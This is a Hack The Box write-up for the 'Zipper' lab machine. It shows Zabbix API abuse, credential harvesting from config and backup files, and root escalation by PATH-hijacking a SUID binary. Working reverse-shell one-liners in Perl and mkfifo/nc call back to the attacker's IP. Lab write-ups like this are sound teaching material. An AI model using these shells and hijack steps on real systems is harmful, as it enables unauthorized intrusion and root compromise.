---
layout: single
title: Zipper - Hack The Box
excerpt: This is the writeup for Zipper, a Linux box running the Zabbix network monitoring software inside a docker container.
date: 2019-02-23
classes: wide
header:
  teaser: /assets/images/htb-writeup-zipper/zipper_logo.png
categories:
  - hackthebox
  - infosec
tags:
  - linux
  - zabbix
  - api
  - suid
---

Zipper was a cool box that mixed some enumeration, API usage and a priv esc using a SUID binary. I had some problems at first getting into Zabbix when I found a possible username but didn't think of trying the same name as the password. The priv esc was pretty cool, I used ltrace to check which functions are called by the binary and I was able to understand what to do next without having to reverse the binary with IDA or R2.

![](/assets/images/htb-writeup-zipper/zipper_logo.png)

## Quick summary

- There's a Zabbix server running and we can log in as guest and obtain the `zapper` username
- We can't log in as `zapper` on the GUI but we can issue API calls
- We can create a script (thru API calls) and get RCE as user `zabbix` within a container
- Then we find the zabbix DB credentials which can also be used to log in as user `admin` on Zabbix
- We can then create a perl reverse shell script and make it run on the zabbix agent (running on the host OS)
- The password for user `zapper` is found in the `backup.sh` script
- We can then `su` to user `zapper` and upload our ssh key and get the user flag
- The priv esc is a suid binary that executes the `systemctl daemon-reload` command
- We can hijack this command by creating our own systemctl file (with a reverse shell), then modify the path so the suid file executes our file instead of `/bin/systemctl`

## Detailed steps

### Nmap

```
root@ragingunicorn:~# nmap -sC -sV -p- 10.10.10.108
Starting Nmap 7.70 ( https://nmap.org ) at 2018-10-20 15:01 EDT
Nmap scan report for 10.10.10.108
Host is up (0.021s latency).
Not shown: 65532 closed ports
PORT      STATE SERVICE    VERSION
22/tcp    open  ssh        OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 59:20:a3:a0:98:f2:a7:14:1e:08:e0:9b:81:72:99:0e (RSA)
|   256 aa:fe:25:f8:21:24:7c:fc:b5:4b:5f:05:24:69:4c:76 (ECDSA)
|_  256 89:28:37:e2:b6:cc:d5:80:38:1f:b2:6a:3a:c3:a1:84 (ED25519)
80/tcp    open  http       Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
10050/tcp open  tcpwrapped
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### Zabbix initial enumeration

Port 10050 hints to a zabbix installation, since this is the port used by the zabbix agent:

```
root@ragingunicorn:~/hackthebox/Machines# nc -nv 10.10.10.108 10050
(UNKNOWN) [10.10.10.108] 10050 (zabbix-agent) open
```

We found the zabbix installation under the `/zabbix` directory.

The default credentials don't work but we can log in as guest.

![](/assets/images/htb-writeup-zipper/zabbix.png)

There's not much interesting except something about a `Zapper's Backup Script`:

![](/assets/images/htb-writeup-zipper/zapper.png)

### Making API calls with user zapper

We can then log in to Zabbix as user `zapper` with password `zapper` (had to guess that part). However, GUI access is not allowed.

![](/assets/images/htb-writeup-zipper/zabbix_nogui.png)

Zabbix has a [REST API](https://www.zabbix.com/documentation/3.0/manual/api) so we can use this instead to issue commands to Zabbix.

The attack steps are:

1. Log in to API
2. Get list of Host IDs
3. Create a script with a simple reverse shell
4. Execute script (make sure to specify host ID)

**Authentication**

Body:

![](/assets/images/htb-writeup-zipper/apiauth.png)

Response:

![](/assets/images/htb-writeup-zipper/apiauth_response.png)

We got the following auth token which we'll re-use for other API calls: `e160aa247a18163cfabe3c5645c8500a`

**Get list of Host IDs**

Body:

![](/assets/images/htb-writeup-zipper/apihost.png)

Response:

![](/assets/images/htb-writeup-zipper/apihost_response1.png)
![](/assets/images/htb-writeup-zipper/apihost_response2.png)

**Create a script for RCE**

Body:

![](/assets/images/htb-writeup-zipper/apiscript.png)

Response:

![](/assets/images/htb-writeup-zipper/apiscript_response.png)

**Execute script**

Body:

![](/assets/images/htb-writeup-zipper/apiexec.png)

### First shell in the container

We got a shell after executing the script from Zabbix:
```
root@ragingunicorn:~# nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.14.23] from (UNKNOWN) [10.10.10.108] 54366
/bin/sh: 0: can't access tty; job control turned off
$ id
uid=103(zabbix) gid=104(zabbix) groups=104(zabbix)
$ hostname
8e5a23a4dfec
$
```

Based on the random hostname and the `.dockerenv` file in the root directory we can assume we're currently in a container:
```
drwxr-xr-x   1 root root 4096 Oct 20 19:27 .
drwxr-xr-x   1 root root 4096 Oct 20 19:27 ..
-rwxr-xr-x   1 root root    0 Oct 20 19:27 .dockerenv
```

There's not much on this container except the Zabbix configuration file:
```
$ pwd
/etc/zabbix
$ ls
apache.conf
web
zabbix_server.conf
$
```

We can find some credentials in there:
```
$ egrep "DBUser|DBPassword" zabbix_server.conf
#       For SQLite3 path to database file must be provided. DBUser and DBPassword are ignored.
### Option: DBUser
# DBUser=
DBUser=zabbix
### Option: DBPassword
DBPassword=f.YMeMd$pTbpY3-449
$
```

- Username: `zabbix`
- Password: `f.YMeMd$pTbpY3-449`

### Getting a shell on the host OS

We can log in to the Zabbix admin page with the `admin` username and `f.YMeMd$pTbpY3-449` password.

![](/assets/images/htb-writeup-zipper/zabbix_admin.png)

Under the Zabbix host, we can see that there are two hosts and one is running the Zabbix Agent.

![](/assets/images/htb-writeup-zipper/zabbix_hosts.png)

The agent is running on the host OS while the Zabbix server is running in a container so what we want to do is modify our existing script so its runs on the Zabbix Agent (therefore on the Host OS) instead of the server.

![](/assets/images/htb-writeup-zipper/zabbix_script2.png)

We can now get a shell on the Host OS but it's not stable and we lose the connection after a few seconds:
```
root@ragingunicorn:~/htb/zipper# nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.14.23] from (UNKNOWN) [10.10.10.108] 55348
/bin/sh: 0: can't access tty; job control turned off
$ hostname
zipper
$ id
uid=107(zabbix) gid=113(zabbix) groups=113(zabbix)
$
```

After trying a few other shells, I found the perl shell works better and is more stable:
```
perl -e 'use Socket;$i="10.10.14.23";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

We now have a stable shell:
```
root@ragingunicorn:~/htb/zipper# nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.14.23] from (UNKNOWN) [10.10.10.108] 46178
/bin/sh: 0: can't access tty; job control turned off
$ w
 20:56:27 up 20 min,  0 users,  load average: 0.02, 0.03, 0.04
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
$ id
uid=107(zabbix) gid=113(zabbix) groups=113(zabbix)
$ hostname
zipper
$ python3 -c 'import pty;pty.spawn("/bin/bash")'
zabbix@zipper:/$
```

We still can't read user.txt though:
```
cat: user.txt: Permission denied
zabbix@zipper:/home/zapper$
```

But we find a password inside the `backup.sh` script:
```
zabbix@zipper:/home/zapper/utils$ ls
backup.sh  zabbix-service
zabbix@zipper:/home/zapper/utils$ cat backup.sh
#!/bin/bash
#
# Quick script to backup all utilities in this folder to /backups
#
/usr/bin/7z a /backups/zapper_backup-$(/bin/date +%F).7z -pZippityDoDah /home/zapper/utils/* &>/dev/null
```

We can `su` to `zapper` using the `ZippityDoDah` password:
```
echo $?zabbix@zipper:/home/zapper/utils$ su zapper
su zapper
Password: ZippityDoDah


              Welcome to:
███████╗██╗██████╗ ██████╗ ███████╗██████╗
╚══███╔╝██║██╔══██╗██╔══██╗██╔════╝██╔══██╗
  ███╔╝ ██║██████╔╝██████╔╝█████╗  ██████╔╝
 ███╔╝  ██║██╔═══╝ ██╔═══╝ ██╔══╝  ██╔══██╗
███████╗██║██║     ██║     ███████╗██║  ██║
╚══════╝╚═╝╚═╝     ╚═╝     ╚══════╝╚═╝  ╚═╝

[0] Packages Need To Be Updated
[>] Backups:



zapper@zipper:~/utils$ cd ..
cd ..
zapper@zipper:~$ cat user.txt
cat user.txt
aa29e9<redacted>
```

### Priv esc

There's an interesting SUID file in the `utils` directory: `zabbix-service`
```
zapper@zipper:~/utils$ ls -l
ls -l
total 12
-rwxr-xr-x 1 zapper zapper  194 Sep  8 13:12 backup.sh
-rwsr-sr-x 1 root   root   7556 Sep  8 13:05 zabbix-service
```

The file seems to control one of the zabbix service:
```
zapper@zipper:~/utils$ ./zabbix-service
./zabbix-service
start or stop?: start
start
```

To see what it does, I used `ltrace` to check which functions are called:
```
zapper@zipper:~/utils$ ltrace -s 256 ./zabbix-service
ltrace -s 256 ./zabbix-service
__libc_start_main(0x45d6ed, 1, 0xbfb57f54, 0x45d840 <unfinished ...>
setuid(0)                                        = -1
setgid(0)                                        = -1
printf("start or stop?: ")                       = 16
fgets(start or stop?: start
start
"start\n", 10, 0xb7f345c0)                 = 0xbfb57e82
strcspn("start\n", "\n")                         = 5
strcmp("start", "start")                         = 0
system("systemctl daemon-reload && systemctl start zabbix-agent"Failed to reload daemon: The name org.freedesktop.PolicyKit1 was not provided by any .service files
 <no return ...>
--- SIGCHLD (Child exited) ---
<... system resumed> )                           = 256
+++ exited (status 0) +++
```

Based on the `ltrace` output, we see that the program executes `systemctl daemon-reload && systemctl start zabbix-agent` as user root.

Because the program doesn't execute systemctl using its full path, it is susceptible to hijacking by changing the PATH environment variable.

We can write a simple bash script that spawns a reverse shell using a named pipe and name it `systemctl`
```
zapper@zipper:~/utils$ cat systemctl
#!/bin/sh

rm /tmp/f2;mkfifo /tmp/f2;/bin/cat /tmp/f2|/bin/sh -i 2>&1|/bin/nc 10.10.14.23 5555 >/tmp/f2
zapper@zipper:~/utils$ chmod +x systemctl
chmod +x systemctl
```

**We need to use /bin/cat instead of just cat because we'll remove /bin from the PATH env variable**

Next, we remove `/bin` from the PATH and add `/home/zapper/utils`:
```
zapper@zipper:~/utils$ echo $PATH
echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games
zapper@zipper:~/utils$ export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/home/zapper/utils
<cal/bin:/usr/sbin:/usr/bin:/sbin:/home/zapper/utils
```

Then we execute `zabbix-service` and it spawn a shell as root.
```
zapper@zipper:~/utils$ ./zabbix-service
./zabbix-service
start or stop?: start
start
/home/zapper/utils/systemctl: 3: /home/zapper/utils/systemctl: rm: not found
```

```
root@ragingunicorn:~/htb/zipper# nc -lvnp 5555
listening on [any] 5555 ...
connect to [10.10.14.23] from (UNKNOWN) [10.10.10.108] 60846
# id
uid=0(root) gid=0(root) groups=0(root),4(adm),24(cdrom),30(dip),46(plugdev),111(lpadmin),112(sambashare),1000(zapper)
# cat /root/root.txt
/bin/sh: 2: cat: not found
# /bin/cat /root/root.txt
a7c743<redacted>
#
```